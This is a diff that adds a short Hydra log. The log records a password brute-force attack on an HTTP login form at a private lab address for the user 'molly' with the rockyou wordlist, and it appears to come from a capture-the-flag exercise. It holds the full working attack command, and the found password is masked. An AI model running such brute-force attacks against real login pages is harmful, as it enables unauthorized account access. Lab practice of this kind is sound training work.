@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2025-03-24 16:59:36 on 10.10.95.12 http-post-form (hydra -t 16 -l molly -o MollyPassHydraHTTP.txt -P /usr/share/wordlists/rockyou.txt -V 10.10.95.12 http-post-form /login:username=^USER^&password=^PASS^:F=Your username or password is incorrect)
+[80][http-post-form] host: 10.10.95.12   login: molly   password: ********
